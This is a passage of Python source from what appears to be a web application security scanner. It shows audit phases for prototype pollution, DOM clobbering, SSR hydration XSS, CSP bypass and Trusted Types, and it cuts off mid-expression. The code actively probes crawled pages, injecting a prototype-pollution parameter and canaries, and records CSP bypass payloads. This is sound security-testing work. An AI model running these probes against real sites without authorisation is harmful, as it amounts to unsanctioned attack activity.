                src_short = (src_file.rsplit("/", 1)[-1]
                              if "/" in src_file else src_file)

                # v10.9: Check if source file is library code
                is_library = _is_library_path(src_file)
                if is_library:
                    finding_dict["library_audit"] = True
                    finding_dict["original_severity"] = finding_dict.get(
                        "severity", "high")
                    finding_dict["severity"] = "info"
                    pp_lib_count += 1
                else:
                    finding_dict["library_audit"] = False
                    pp_app_count += 1

                affects_label = (
                    f" [affects {len(affects)} pages]"
                    if len(affects) > 1 else ""
                )
                lib_label = " [LIBRARY AUDIT]" if is_library else ""
                # v10.10: detect any DOMPurify CVE chain (kind starts with "cve-")
                # — covers CVE-2024-47875, CVE-2025-26791, CVE-2026-41238, future
                if kind.startswith("cve-"):
                    dp_ver = finding_dict.get("dompurify_version", "?")
                    cve_id = finding_dict.get("cve", kind.upper())
                    cve_sev = finding_dict.get("severity", "high")
                    cve_vector = finding_dict.get("cve_vector", "")
                    cve_desc = finding_dict.get("cve_description", "")
                    sev_label = f"({cve_sev})"
                    desc_part = f" — {cve_desc}" if cve_desc else ""
                    payload_label = (
                        f"PP→DOMPurify {cve_id} {sev_label}: "
                        f"{src_pat} @ {src_short}:{src_line} "
                        f"+ DOMPurify {dp_ver}{desc_part}"
                        f"{affects_label}{lib_label}"
                    )
                    _emit_hit(cb, {
                        "url":      first_url,
                        "param":    f"PP:{cve_id}",
                        "context":  f"proto-pollution-cve ({cve_sev})",
                        "csp_note": "",
                        "status":   "PP-CVE",
                        "source":   "proto-pollution",
                        "payload":  payload_label,
                        # v10.24: hoist fp_risk/severity/potential na top-level,
                        # ať to vidí report I evidence store (ne jen vnořený
                        # proto_pollution_finding) — jinak by se chain uložil
                        # bez fp_risk labelu = kontaminace ML dat.
                        "severity":           finding_dict.get("severity"),
                        "fp_risk":            finding_dict.get("fp_risk", False),
                        "potential_severity": finding_dict.get("potential_severity"),
                        "fp_reason":          finding_dict.get("fp_reason"),
                        "proto_pollution_finding": finding_dict,
                    })
                else:
                    final_sev = finding_dict.get("severity", "high")
                    gad_prop = finding_dict.get("gadget_property", "?")
                    gad_kind = finding_dict.get("gadget_kind", "?")
                    gad_file = finding_dict.get("gadget_file", "?")
                    gad_line = finding_dict.get("gadget_line", 0)
                    gad_short = (gad_file.rsplit("/", 1)[-1]
                                  if "/" in gad_file else gad_file)
                    # v10.18 (FP#1.5 runtime gate): pokud je zapnutá headless
                    # verifikace a chain NENÍ knihovní, ověř pollution v REÁLNÉM
                    # prohlížeči. Runtime probe vstříkne ?__proto__[token]=… a
                    # zkontroluje Object.prototype. Potvrzeno → HIGH (jistota);
                    # nepotvrzeno → necháme INFO (statický gate už degradoval).
                    if (headless_verify and not is_library
                            and _HEADLESS_VERIFIER_AVAILABLE and first_url):
                        try:
                            _pp_hv = _HV(headless=True, timeout_s=10.0,
                                         framework_wait_ms=600)
                            _pp_hv.__enter__()
                            if _pp_hv.available:
                                _pv = _pp_hv.verify_prototype_pollution(first_url)
                                finding_dict["runtime_probe"] = _pv.status.value
                                if _pv.executed:
                                    finding_dict["severity"] = "high"
                                    finding_dict["chain_verified"] = True
                                    finding_dict["runtime_confirmed"] = True
                                    finding_dict["runtime_evidence"] = _pv.evidence
                                    final_sev = "high"
                                    cb["on_log"](
                                        f"[PP] ✓ RUNTIME CONFIRMED pollution "
                                        f"@ {first_url}: {_pv.evidence[:80]}",
                                        "info")
                                else:
                                    # Reálný prohlížeč nepotvrdil → drž INFO.
                                    if finding_dict.get("severity") not in ("info",):
                                        finding_dict["original_severity"] = \
                                            finding_dict.get("severity")
                                        finding_dict["severity"] = "info"
                                        final_sev = "info"
                                    finding_dict["downgrade_reason"] = (
                                        "runtime probe did not pollute "
                                        "Object.prototype — unconfirmed")
                                    cb["on_log"](
                                        f"[PP] runtime probe did NOT confirm "
                                        f"@ {first_url} → kept INFO", "info")
                            _pp_hv.__exit__(None, None, None)
                        except Exception as _ppe:
                            cb["on_log"](
                                f"[PP] runtime probe error: {_ppe}", "info")
                    _pp_dedup = None
                    if is_library:
                        # v10.73 FP-cut: jQuery's extend for-in IS CVE-2019-11358.
                        # When the CVE feed already flags this vendor file, don't
                        # also emit the internal chain (kept in proto_pollution_
                        # findings for audit); else dedup on the FILE, not the page.
                        if src_short.lower() in _cve_lib_files:
                            continue
                        # v10.74 FP-cut: a library-internal chain that is only a
                        # co-located source+gadget candidate (fp_risk, no verified
                        # data-flow edge) — typically stitched across two unrelated
                        # vendor bundles (three.js → doT.js, photo-sphere-viewer) —
                        # is pure noise in primary RESULTS. Suppress it here; it
                        # stays in proto_pollution_findings for the audit view.
                        # NOTE: application-code fp_risk chains are NOT suppressed
                        # (only is_library), so real app candidates still surface.
                        if finding_dict.get("fp_risk"):
                            continue
                        _pp_dedup = f"lib-pp:{src_short.lower()}"
                    payload_label = (
                        f"PP chain: {src_pat} @ {src_short}:{src_line} "
                        f"→ gadget '{gad_prop}' ({gad_kind}) "
                        f"@ {gad_short}:{gad_line}{affects_label}{lib_label}"
                    )
                    _emit_hit(cb, {
                        "url":      first_url,
                        "param":    "PP:chain",
                        "context":  f"proto-pollution-chain ({final_sev})",
                        "csp_note": "",
                        "status":   "PP",
                        "source":   "proto-pollution",
                        "payload":  payload_label,
                        "dedup_url": _pp_dedup,
                        # v10.24: hoist fp_risk/severity/potential na top-level
                        # (viz CASE 1) — chain je ko-lokační kandidát, MUSÍ nést
                        # fp_risk i v reportu i ve store.
                        "severity":           finding_dict.get("severity"),
                        "fp_risk":            finding_dict.get("fp_risk", False),
                        "potential_severity": finding_dict.get("potential_severity"),
                        "fp_reason":          finding_dict.get("fp_reason"),
                        "proto_pollution_finding": finding_dict,
                    })

            cb["on_log"](
                f"[PP] done: {len(proto_pollution_findings)} findings "
                f"({cve_chains_found} DOMPurify CVE chains, "
                f"{chains_found} generic chains), "
                f"{total_sources} sources, {total_gadgets} gadgets, "
                f"{vuln_dompurify_found} vulnerable DOMPurify deps "
                f"→ aggregated to {len(pp_aggregation)} unique chain(s) "
                f"({pp_app_count} application, {pp_lib_count} library-only)",
                "info"
            )

        except Exception as e:
            cb["on_log"](
                f"[!] Prototype Pollution phase crashed: {e}", "warn"
            )

    elif not _PROTO_POLLUTION_AVAILABLE and proto_pollution:
        cb["on_log"](
            "Prototype Pollution analyzer: modul _proto_pollution_analyzer.py "
            "not available — skipped", "info"
        )

    # ════════════════════════════════════════════════════════════════════════
    # DOM CLOBBERING → XSS CHAIN PHASE (v10.4 — Intigriti March 2026 CTF)
    # ════════════════════════════════════════════════════════════════════════
    # Pro každou crawlovanou stránku:
    #   1. Stáhni HTML + extrahuj inline <script> + externí .js
    #   2. AST audit (3 patterns):
    #      A. Sanitizer config bez FORBID_ATTR pro name/id/for
    #      B. Property reads na unowned globals (window.X.dataset, atd.)
    #      C. Dangerous sinks ze čtoucí unowned identifierů
    #         (script.src = mGlobals.scriptUrl, eval(appConfig.script))
    #   3. Chain detection:
    #      - sanitizer issue + clobberable sink v stejné stránce = HIGH chain
    #      - jen sanitizer issue NEBO jen sink = INFO/MEDIUM
    # Cost: ~ms/page (pure offline AST, žádné runtime).
    # ════════════════════════════════════════════════════════════════════════
    dom_clobbering_findings: List[Dict] = []
    if (_DOM_CLOBBERING_AVAILABLE and dom_clobbering
            and not _cancelled.is_set()
            and _phase_target_alive("DOM-CLOBBERING")):
        try:
            cb["on_log"]("DOM Clobbering → XSS chain audit (Intigriti 2026)...", "info")
            cb["on_phase"]("dom_clobbering", {})

            MAX_DC_PAGES = 50
            dc_pages_seen: set = set()
            dc_pages_to_check: List[str] = [target]
            dc_pages_seen.add(_normalize_endpoint(target))
            for u in (pages or []):
                if _cancelled.is_set():
                    break
                ne = _normalize_endpoint(u)
                if ne in dc_pages_seen:
                    continue
                dc_pages_seen.add(ne)
                dc_pages_to_check.append(u)
                if len(dc_pages_to_check) >= MAX_DC_PAGES:
                    break

            cb["on_log"](
                f"[DC] {len(dc_pages_to_check)} pages to audit", "info"
            )

            dc_external_js_seen: Set[str] = set()
            MAX_DC_EXTERNAL_JS = 30
            chain_count = 0
            sink_total = 0
            sanitizer_total = 0

            for idx, page_url in enumerate(dc_pages_to_check):
                if _cancelled.is_set():
                    break
                cb["on_progress"](idx + 1, len(dc_pages_to_check))
                try:
                    resp = session_workers.get(
                        page_url, timeout=timeout, allow_redirects=True
                    )
                    if resp is None or resp.status_code >= 400:
                        continue
                    html_dc = resp.text or ""
                    if not html_dc:
                        continue

                    # Inline scripts
                    inline_bodies: List[str] = []
                    if _sjs_analyze_html and html_dc:
                        from _static_js_analyzer import extract_inline_scripts
                        for body, _line in extract_inline_scripts(html_dc):
                            inline_bodies.append(body)

                    # External JS (capped, shared with PP/static_js)
                    external_sources: Dict[str, str] = {}
                    if _sjs_external_urls:
                        ext_urls = _sjs_external_urls(html_dc, base_url=page_url)
                        for js_url in ext_urls:
                            if js_url in dc_external_js_seen:
                                continue
                            if len(dc_external_js_seen) >= MAX_DC_EXTERNAL_JS:
                                break
                            dc_external_js_seen.add(js_url)
                            try:
                                jr = session_workers.get(
                                    js_url, timeout=timeout, allow_redirects=True
                                )
                                if jr is None or jr.status_code >= 400:
                                    continue
                                external_sources[js_url] = jr.text or ""
                            except Exception:
                                continue

                    # Build clobbering report
                    report = _dc_build_report(
                        url=page_url,
                        inline_scripts=inline_bodies,
                        external_scripts=external_sources,
                    )
                    sink_total += len(report.sinks)
                    sanitizer_total += len(report.sanitizer_issues)

                    # Chain detection: sanitizer issue + sink IN THE SAME FILE.
                    if report.has_chain:
                        # v10.76 FP fix: only pair a sanitizer issue with sinks
                        # from the SAME file (no cross-vendor stitch), pick the
                        # strongest such sink, and DEMOTE to info/library when the
                        # code lives in a vendor bundle (mirrors the PP/static-js
                        # phases). Previously best_sink was chosen over ALL sinks
                        # and paired with every issue → spurious app-code HIGH from
                        # an unrelated jQuery/owl.carousel read.
                        _sev_rank = {"critical": 3, "high": 2, "medium": 1}
                        _sinks_by_file: Dict[str, list] = {}
                        for _s in report.sinks:
                            _sinks_by_file.setdefault(_s.file, []).append(_s)
                        for san in report.sanitizer_issues:
                            same_file_sinks = _sinks_by_file.get(san.file)
                            if not same_file_sinks:
                                continue   # no sink in this issue's file → no chain
                            best_sink = max(
                                same_file_sinks,
                                key=lambda s: (_sev_rank.get(s.severity, 0),
                                               s.confidence))
                            _dc_is_lib = (_is_library_path(san.file)
                                          or _is_library_path(best_sink.file))
                            _dc_sev = "info" if _dc_is_lib else "high"
                            chain_count += 1
                            finding_dict = {
                                "url": page_url,
                                "kind": "chain",
                                "severity": _dc_sev,
                                "library_audit": _dc_is_lib,
                                "fp_risk": _dc_is_lib,
                                "sanitizer": san.sanitizer,
                                "sanitizer_file": san.file,
                                "sanitizer_line": san.line,
                                "sanitizer_issue": san.issue,
                                "sink_pattern": best_sink.pattern,
                                "sink_receiver": best_sink.receiver,
                                "sink_kind": best_sink.sink_kind,
                                "sink_file": best_sink.file,
                                "sink_line": best_sink.line,
                                "snippet": best_sink.snippet,
                            }
                            dom_clobbering_findings.append(finding_dict)
                            sink_short = (best_sink.file.rsplit("/", 1)[-1]
                                          if "/" in best_sink.file else best_sink.file)
                            _lib_tag = " [LIBRARY AUDIT]" if _dc_is_lib else ""
                            payload_label = (
                                f"DOM Clobbering chain: {san.sanitizer}.sanitize() "
                                f"missing FORBID_ATTR for name/id/for + "
                                f"sink '{best_sink.pattern}' @ "
                                f"{sink_short}:{best_sink.line}{_lib_tag}"
                            )
                            _emit_hit(cb, {
                                "url": page_url,
                                "param": "DC:chain",
                                "context": f"dom-clobbering-chain ({_dc_sev})",
                                "csp_note": "",
                                "status": "DC",
                                "source": "dom-clobbering",
                                "payload": payload_label,
                                "dom_clobbering_finding": finding_dict,
                            })
                            cb["on_log"](
                                f"[DC] 🎯 chain: {san.sanitizer} sanitizer "
                                f"+ {best_sink.pattern[:60]}",
                                "info"
                            )

                except Exception as e:
                    cb["on_log"](
                        f"[DC] error on {page_url[:80]}: "
                        f"{type(e).__name__}: {e}", "warn"
                    )

            cb["on_log"](
                f"[DC] done: {len(dom_clobbering_findings)} findings "
                f"({chain_count} chains), "
                f"{sink_total} sinks, {sanitizer_total} sanitizer issues",
                "info"
            )

        except Exception as e:
            cb["on_log"](
                f"[!] DOM Clobbering phase crashed: {e}", "warn"
            )

    elif not _DOM_CLOBBERING_AVAILABLE and dom_clobbering:
        cb["on_log"](
            "DOM Clobbering analyzer: esprima not available — skipped", "info"
        )

    # ════════════════════════════════════════════════════════════════════════
    # SSR HYDRATION XSS PHASE (v10.5 — CVE-2026-27902 Svelte 5 + general SSR)
    # ════════════════════════════════════════════════════════════════════════
    # For each crawled page:
    #   1. Fetch HTML
    #   2. Layer 1 — framework fingerprint (Svelte/SvelteKit/Next/Nuxt/Remix/
    #      Astro) + version classification (CVE-2026-27902 Svelte 5.53.0-5.53.4,
    #      CVE-2026-27125 Svelte 5.x <5.51.5, CVE-2024-45047 Svelte <4.2.19)
    #   3. Layer 2 — initial HTML audit:
    #      - JSON-in-HTML-comment with comment-break (CVE-2026-27902 pattern)
    #      - <script type="application/json"> with literal </script> body
    #      - reflected canary in hydration JSON (if marker enabled)
    # Cost: ~ms/page (regex + text scan, no AST). Complementary with PP/DC.
    # ════════════════════════════════════════════════════════════════════════
    ssr_hydration_findings: List[Dict] = []
    if (ssr_hydration and not _cancelled.is_set()
            and _phase_target_alive("SSR-HYDRATION")):
        try:
            cb["on_log"]("SSR Hydration XSS audit (CVE-2026-27902 + frameworks)...", "info")
            cb["on_phase"]("ssr_hydration", {})

            # v10.9: SSR aggregation — same comment-break / script-break pattern
            # appearing on multiple pages (e.g. shared layout) = 1 logical
            # finding. Key: (kind, excerpt[:80], cve)
            ssr_aggregation: Dict[Tuple, Dict] = {}

            MAX_SSR_PAGES = 50
            ssr_pages_seen: set = set()
            ssr_pages_to_check: List[str] = [target]
            ssr_pages_seen.add(_normalize_endpoint(target))
            for u in (pages or []):
                if _cancelled.is_set():
                    break
                ne = _normalize_endpoint(u)
                if ne in ssr_pages_seen:
                    continue
                ssr_pages_seen.add(ne)
                ssr_pages_to_check.append(u)
                if len(ssr_pages_to_check) >= MAX_SSR_PAGES:
                    break

            cb["on_log"](
                f"[SSR] {len(ssr_pages_to_check)} pages to audit", "info"
            )

            # v10.76 FN fix: the reflected-in-hydration check used a FIXED literal
            # ("XSGD_CANARY") that was never injected into any request, so it could
            # only ever match by coincidence — a dead detector. When the marker
            # machinery is enabled we now generate a REAL unique canary base and
            # INJECT `marker_param=<canary>` into each fetched page below, so a
            # reflection into hydration JSON is genuinely tested.
            _ssr_canary_base: Optional[str] = None
            if marker_enabled and marker_param:
                import random as _ssr_rng
                _ssr_canary_base = "xsgssr%08x" % _ssr_rng.getrandbits(32)

            ssr_external_js_seen: Set[str] = set()
            MAX_SSR_EXTERNAL_JS = 8   # smaller — we mostly need version banners
            cve_count = 0
            comment_break_count = 0
            script_break_count = 0
            reflected_count = 0
            framework_detected: Optional[str] = None

            for idx, page_url in enumerate(ssr_pages_to_check):
                if _cancelled.is_set():
                    break
                cb["on_progress"](idx + 1, len(ssr_pages_to_check))
                try:
                    # v10.76: inject a unique canary into the fetched URL so the
                    # reflected-in-hydration check actually has something to find.
                    _ssr_canary = None
                    _fetch_url = page_url
                    if _ssr_canary_base:
                        _ssr_canary = f"{_ssr_canary_base}{idx}"
                        _sep = "&" if "?" in _fetch_url else "?"
                        _fetch_url = f"{_fetch_url}{_sep}{marker_param}={_ssr_canary}"
                    resp = session_workers.get(
                        _fetch_url, timeout=timeout, allow_redirects=True
                    )
                    if resp is None or resp.status_code >= 400:
                        continue
                    html_ssr = resp.text or ""
                    if not html_ssr:
                        continue

                    # Fetch a few JS bundles for version banner extraction
                    external_sources: Dict[str, str] = {}
                    if _sjs_external_urls:
                        ext_urls = _sjs_external_urls(html_ssr, base_url=page_url)
                        for js_url in ext_urls:
                            if js_url in ssr_external_js_seen:
                                continue
                            if len(ssr_external_js_seen) >= MAX_SSR_EXTERNAL_JS:
                                break
                            ssr_external_js_seen.add(js_url)
                            try:
                                jr = session_workers.get(
                                    js_url, timeout=timeout, allow_redirects=True
                                )
                                if jr is None or jr.status_code >= 400:
                                    continue
                                external_sources[js_url] = jr.text or ""
                            except Exception:
                                continue

                    report = _ssr_build_report(
                        url=page_url,
                        html=html_ssr,
                        js_sources=external_sources,
                        canary=_ssr_canary,
                    )
                    if framework_detected is None and report.framework:
                        framework_detected = report.framework

                    for f in report.findings:
                        finding_dict = {
                            "url": page_url,
                            "kind": f.kind,
                            "severity": f.severity,
                            "framework": f.framework,
                            "version": f.version,
                            "cve": f.cve,
                            "line": f.line,
                            "excerpt": f.excerpt,
                            "description": f.description,
                            "confidence": f.confidence,
                        }
                        ssr_hydration_findings.append(finding_dict)

                        # Classify counts
                        if f.kind == "framework-cve":
                            cve_count += 1
                        elif f.kind == "comment-break":
                            comment_break_count += 1
                        elif f.kind == "script-break":
                            script_break_count += 1
                        elif f.kind == "reflected-in-hydration":
                            reflected_count += 1

                        # v10.9: aggregate by (kind, excerpt[:80], cve) — same
                        # pattern across pages (shared layout) = 1 finding
                        agg_key = (
                            f.kind,
                            (f.excerpt or "")[:80],
                            f.cve or "",
                        )
                        if agg_key not in ssr_aggregation:
                            ssr_aggregation[agg_key] = {
                                "finding": finding_dict,
                                "affects_pages": [],
                            }
                        if page_url not in ssr_aggregation[agg_key]["affects_pages"]:
                            ssr_aggregation[agg_key]["affects_pages"].append(page_url)
                        # NOTE: emit moved to after-loop aggregated emit

                except Exception as e:
                    cb["on_log"](
                        f"[SSR] error on {page_url[:80]}: "
                        f"{type(e).__name__}: {e}", "warn"
                    )

            # v10.9: After-loop aggregated emit
            for agg_key, agg in ssr_aggregation.items():
                finding_dict = dict(agg["finding"])
                affects = agg["affects_pages"]
                finding_dict["affects_pages"] = affects
                finding_dict["affects_count"] = len(affects)
                first_url = affects[0] if affects else finding_dict.get("url", "")
                kind = finding_dict.get("kind", "?")
                cve = finding_dict.get("cve") or ""
                framework = finding_dict.get("framework", "?")
                version = finding_dict.get("version") or "?"
                description = finding_dict.get("description", "?")
                severity = finding_dict.get("severity", "high")
                affects_label = (
                    f" [affects {len(affects)} pages]"
                    if len(affects) > 1 else ""
                )
                cve_str = f"[{cve}] " if cve else ""
                fw_str = (f"{framework} {version} "
                           if framework and framework != "?" else "")
                payload_label = (
                    f"{cve_str}{fw_str}{kind}: "
                    f"{description[:120]}{affects_label}"
                )
                param_label = {
                    "framework-cve": f"SSR:{cve or '?'}",
                    "comment-break": "SSR:comment-break",
                    "script-break": "SSR:script-break",
                    "reflected-in-hydration": "SSR:reflected",
                }.get(kind, f"SSR:{kind}")
                _emit_hit(cb, {
                    "url": first_url,
                    "param": param_label,
                    "context": f"ssr-hydration-{kind} ({severity})",
                    "csp_note": "",
                    "status": "SSR",
                    "source": "ssr-hydration",
                    "payload": payload_label,
                    "ssr_hydration_finding": finding_dict,
                })

            cb["on_log"](
                f"[SSR] done: {len(ssr_hydration_findings)} findings "
                f"(framework: {framework_detected or 'none'}, "
                f"{cve_count} CVE, "
                f"{comment_break_count} comment-break, "
                f"{script_break_count} script-break, "
                f"{reflected_count} reflected)"
                f" → aggregated to {len(ssr_aggregation)} unique finding(s)",
                "info"
            )

        except Exception as e:
            cb["on_log"](
                f"[!] SSR Hydration phase crashed: {e}", "warn"
            )

    # ════════════════════════════════════════════════════════════════════════
    # CSP BYPASS DETECTION PHASE (v10.6 — 2026 NEJVĚTŠÍ DÍRA, 94.72% bypass)
    # ════════════════════════════════════════════════════════════════════════
    # For each crawled page:
    #   1. Fetch HTML + CSP header (Content-Security-Policy /
    #      Content-Security-Policy-Report-Only)
    #   2. Run 6-layer CSP bypass audit:
    #      A) Whitelist entries with known JSONP/redirector bypasses
    #      B) Unsafe-inline / unsafe-eval / missing base-uri / object-src
    #      C) Nonce reuse (fetch URL twice, compare nonces)
    #      D) Meta-tag CSP detection (vs header — meta is leakable)
    #      E) Wildcard host risk (top-level wildcards *.com / *.io)
    #      F) CSS injection sinks (CVE-2026-2441 — template vars in <style>)
    # Cost: ~ms/page (regex/string scan, 1 extra fetch per page for
    # nonce-reuse check).
    # ════════════════════════════════════════════════════════════════════════
    csp_bypass_findings: List[Dict] = []
    if (csp_bypass and not _cancelled.is_set()
            and _phase_target_alive("CSP-BYPASS")):
        try:
            cb["on_log"](
                "CSP Bypass audit (94.72%% policies bypassable, Tranco 50k 2023)...",
                "info"
            )
            cb["on_phase"]("csp_bypass", {})

            # v10.9: Aggregation map for smart dedup. Same misconfig (e.g.
            # base-uri missing) across N pages = 1 logical finding with
            # affects_pages list. Key: (layer, directive, offending_value).
            csp_aggregation: Dict[Tuple, Dict] = {}

            MAX_CSP_PAGES = 50
            csp_pages_seen: set = set()
            csp_pages_to_check: List[str] = [target]
            csp_pages_seen.add(_normalize_endpoint(target))
            for u in (pages or []):
                if _cancelled.is_set():
                    break
                ne = _normalize_endpoint(u)
                if ne in csp_pages_seen:
                    continue
                csp_pages_seen.add(ne)
                csp_pages_to_check.append(u)
                if len(csp_pages_to_check) >= MAX_CSP_PAGES:
                    break

            cb["on_log"](
                f"[CSP] {len(csp_pages_to_check)} pages to audit", "info"
            )

            # For nonce-reuse, we'll fetch each URL TWICE only on the first
            # page (target itself) to keep network cost low.
            target_csp_first = ""
            target_csp_second = ""

            total_findings = 0
            critical_findings = 0
            by_layer_count: Dict[str, int] = {}

            for idx, page_url in enumerate(csp_pages_to_check):
                if _cancelled.is_set():
                    break
                cb["on_progress"](idx + 1, len(csp_pages_to_check))
                try:
                    resp = session_workers.get(
                        page_url, timeout=timeout, allow_redirects=True
                    )
                    if resp is None or resp.status_code >= 400:
                        continue
                    html_csp = resp.text or ""
                    # Try both enforce and report-only CSP headers
                    csp_header = (
                        resp.headers.get("Content-Security-Policy", "")
                        or resp.headers.get("Content-Security-Policy-Report-Only", "")
                    )

                    # Nonce-reuse check only for target URL (1 extra fetch)
                    csp_second = ""
                    if page_url == target and csp_header:
                        target_csp_first = csp_header
                        try:
                            # Cache-bust to ensure fresh response
                            sep = "&" if "?" in page_url else "?"
                            r2 = session_workers.get(
                                page_url + f"{sep}_csp_check={int(time.time()*1000)}",
                                timeout=timeout, allow_redirects=True
                            )
                            if r2 is not None and r2.status_code < 400:
                                target_csp_second = (
                                    r2.headers.get("Content-Security-Policy", "")
                                    or r2.headers.get(
                                        "Content-Security-Policy-Report-Only", "")
                                )
                                csp_second = target_csp_second
                        except Exception:
                            pass

                    report = _csp_build_bypass_report(
                        url=page_url,
                        csp_value=csp_header,
                        html=html_csp,
                        csp_value_second=csp_second,
                    )

                    for f in report.findings:
                        finding_dict = {
                            "url": page_url,
                            "layer": f.layer,
                            "severity": f.severity,
                            "directive": f.directive,
                            "offending_value": f.offending_value,
                            "issue": f.issue,
                            "bypass_payload": f.bypass_payload,
                            "confidence": f.confidence,
                        }
                        csp_bypass_findings.append(finding_dict)
                        total_findings += 1
                        if f.severity == "critical":
                            critical_findings += 1
                        by_layer_count[f.layer] = by_layer_count.get(f.layer, 0) + 1

                        # v10.9: aggregate by (layer, directive, offending_value)
                        # — same misconfig × N pages = 1 logical finding
                        agg_key = (f.layer, f.directive, f.offending_value)
                        if agg_key not in csp_aggregation:
                            csp_aggregation[agg_key] = {
                                "finding": finding_dict,
                                "affects_pages": [],
                            }
                        if page_url not in csp_aggregation[agg_key]["affects_pages"]:
                            csp_aggregation[agg_key]["affects_pages"].append(page_url)
                        # NOTE: emit moved to after-loop aggregated emit

                except Exception as e:
                    cb["on_log"](
                        f"[CSP] error on {page_url[:80]}: "
                        f"{type(e).__name__}: {e}", "warn"
                    )

            # v10.9: After-loop aggregated emit — 1 hit per unique misconfig
            for agg_key, agg in csp_aggregation.items():
                finding_dict = dict(agg["finding"])
                affects = agg["affects_pages"]
                finding_dict["affects_pages"] = affects
                finding_dict["affects_count"] = len(affects)
                first_url = affects[0] if affects else finding_dict.get("url", "")
                layer = finding_dict.get("layer", "?")
                sev = finding_dict.get("severity", "medium")
                affects_label = (
                    f" [affects {len(affects)} pages]"
                    if len(affects) > 1 else ""
                )
                param_label = f"CSP:{layer.replace('-', '')[:9]}"
                _emit_hit(cb, {
                    "url": first_url,
                    "param": param_label,
                    "context": f"csp-bypass-{layer} ({sev})",
                    "csp_note": "",
                    "status": "CSP",
                    "source": "csp-bypass",
                    "payload": (finding_dict.get("issue", "")[:200] + affects_label),
                    "csp_bypass_finding": finding_dict,
                })

            layer_summary = ", ".join(
                f"{k}={v}" for k, v in sorted(by_layer_count.items())
            ) or "none"
            cb["on_log"](
                f"[CSP] done: {total_findings} findings "
                f"({critical_findings} critical), layers: {layer_summary}"
                f" → aggregated to {len(csp_aggregation)} unique finding(s)",
                "info"
            )

        except Exception as e:
            cb["on_log"](
                f"[!] CSP Bypass phase crashed: {e}", "warn"
            )

    # ════════════════════════════════════════════════════════════════════════
    # TRUSTED TYPES ANALYZER PHASE (v8 — 2026 modern XSS defense audit)
    # ════════════════════════════════════════════════════════════════════════
    # Pro každou crawlovanou stránku:
    #   1. Stáhni HTML + extrahuj CSP header (oba: enforce + report-only)
    #   2. Audituj CSP — Trusted Types directives, default policy presence,
    #      wildcards, report-only-only enforcement
    #   3. Extrahuj inline <script> bloky + externí .js
    #   4. AST audit — najdi createPolicy() calls, klasifikuj transformer
    #      funkce: pass-through, weak regex, DOMPurify-backed
    #   5. Highlight: default policy + insecure transformer = silent backdoor
    #
    # Cost: ~ms per stránku (HTTP header parsing + AST), externí JS reuse
    # cache pokud static_js fáze běžela.
    # ════════════════════════════════════════════════════════════════════════
    trusted_types_findings: List[Dict] = []
    if (_TRUSTED_TYPES_AVAILABLE and trusted_types and not _cancelled.is_set()
            and _phase_target_alive("TT")):
        try:
            cb["on_log"]("Trusted Types audit (CSP + policy AST)...", "info")
            cb["on_phase"]("trusted_types", {})

            MAX_TT_PAGES = 50
            tt_pages_seen: set = set()
            tt_pages_to_check: List[str] = [target]
            tt_pages_seen.add(_normalize_endpoint(target))
            for u in (pages or []):
                if _cancelled.is_set():
                    break
                ne = _normalize_endpoint(u)
                if ne in tt_pages_seen:
                    continue
                tt_pages_seen.add(ne)
                tt_pages_to_check.append(u)
                if len(tt_pages_to_check) >= MAX_TT_PAGES:
                    break

            cb["on_log"](
                f"[TT] {len(tt_pages_to_check)} pages to audit", "info"
            )

            tt_external_js_seen: Set[str] = set()
            MAX_TT_EXTERNAL_JS = 30
            policies_audited = 0
            csp_with_tt = 0

            for idx, page_url in enumerate(tt_pages_to_check):
                if _cancelled.is_set():
                    break
                cb["on_progress"](idx + 1, len(tt_pages_to_check))
                try:
                    resp = session_workers.get(page_url, timeout=timeout,
                                                allow_redirects=True)
                    if resp is None or resp.status_code >= 400:
                        continue
                    html = resp.text or ""
                    if not html:
                        continue

                    # CSP headers — both enforce and report-only
                    csp_header = (resp.headers.get("Content-Security-Policy")
                                  or resp.headers.get("content-security-policy")
                                  or "")
                    csp_ro = (resp.headers.get("Content-Security-Policy-Report-Only")
                              or resp.headers.get("content-security-policy-report-only")
                              or "")

                    # Collect inline scripts
                    inline_bodies = []
                    if _sjs_analyze_html and html:
                        from _static_js_analyzer import extract_inline_scripts
                        for body, _line in extract_inline_scripts(html):
                            inline_bodies.append(body)

                    # Collect external .js (capped) — only fetch if not seen
                    external_sources: Dict[str, str] = {}
                    if _sjs_external_urls:
                        ext_urls = _sjs_external_urls(html, base_url=page_url)
                        for js_url in ext_urls:
                            if js_url in tt_external_js_seen:
                                continue
                            if len(tt_external_js_seen) >= MAX_TT_EXTERNAL_JS:
                                break
                            tt_external_js_seen.add(js_url)
                            try:
                                jr = session_workers.get(js_url, timeout=timeout,
                                                          allow_redirects=True)
                                if jr is None or jr.status_code >= 400:
                                    continue
                                external_sources[js_url] = jr.text or ""
                            except Exception:
                                continue

                    # Build report
                    report = _tt_build_report(
                        url=page_url,
                        csp_header=csp_header or None,
                        csp_report_only=csp_ro or None,
                        inline_scripts=inline_bodies,
                        external_scripts=external_sources,
                    )

                    # Emit CSP-level findings
                    csp_info = report.csp_info
                    if csp_info and csp_info.opted_in:
                        csp_with_tt += 1
                    if csp_info and csp_info.issues:
                        # CSP itself is misconfigured — emit one finding per page
                        # that grouped issues (high/medium/low)
                        finding_dict = {
                            "url":            page_url,
                            "kind":           "csp",
                            "severity":       csp_info.severity,
                            "enforced":       csp_info.enforced,
                            "report_only":    csp_info.report_only,
                            "wildcard":       csp_info.wildcard,
                            "has_default":    csp_info.has_default_in_allowlist,
                            "policies":       csp_info.allowed_policies,
                            "issues":         csp_info.issues,
                        }
                        trusted_types_findings.append(finding_dict)
                        if csp_info.severity in ("high", "medium"):
                            _emit_hit(cb, {
                                "url":      page_url,
                                "param":    "CSP:trusted-types",
                                "context":  f"trusted-types-csp ({csp_info.severity})",
                                "csp_note": csp_info.issues[0] if csp_info.issues else "",
                                "status":   "TT-CSP",
                                "source":   "trusted-types",
                                "payload":  f"TT CSP: {csp_info.issues[0][:100] if csp_info.issues else 'misconfig'}",
                                "trusted_types_finding": finding_dict,
                            })

                    # Emit policy findings (per createPolicy)
                    for pf in report.policy_findings:
                        policies_audited += 1
                        finding_dict = {
                            "url":             page_url,
                            "kind":            "policy",
                            "policy_name":     pf.policy_name,
                            "is_default":      pf.is_default_policy,
                            "file":            pf.file,
                            "line":            pf.line,
                            "severity":        pf.severity,
                            "methods_defined": pf.methods_defined,
                            "insecure_methods": [
                                {"method": m, "reason": r}
                                for m, r in pf.insecure_methods
                            ],
                            "snippet":         pf.snippet,
                        }
                        trusted_types_findings.append(finding_dict)
                        if pf.severity in ("critical", "high", "medium"):
                            file_str = pf.file or ""
                            file_short = (file_str.rsplit("/", 1)[-1]
